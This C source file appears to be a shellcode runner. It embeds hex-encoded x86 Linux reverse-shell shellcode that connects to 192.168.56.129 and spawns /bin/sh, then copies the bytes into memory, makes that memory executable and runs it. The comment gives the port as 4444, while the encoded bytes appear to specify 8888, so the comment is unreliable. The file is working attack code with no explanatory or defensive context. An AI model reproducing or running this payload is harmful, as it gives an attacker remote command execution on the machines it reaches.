#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>
#include <malloc.h>

// reverse shell 192.168.56.129 4444
unsigned char buf[] = \
"\x29\xc0\x31\xdb\x29\xc9\x31\xd2\x29\xf6\x66\xb8\x67\x01\xb3"
"\x02\xb1\x01\xcd\x80\x89\xc3\x52\x52\x68\xc0\xa8\x38\x81\x66"
"\x68\x22\xb8\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd"
"\x80\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f"
"\xcd\x80\x29\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";


int main()
{

	printf("Shellbuf Length:  %d\n", strlen(buf));

    int pagesize = getpagesize ();

    printf("Page size: %d\n", pagesize);

    char * buffer = memalign(pagesize, pagesize);

    memcpy(buffer, buf, strlen(buf));

    int result = mprotect(buffer, pagesize, PROT_READ | PROT_EXEC | PROT_WRITE);

	if (result){
		printf("Memory protection failed: %d\n", errno);

		return 5;
	}

	int (*ret)() = (int(*)())buffer;

	ret();

}

	
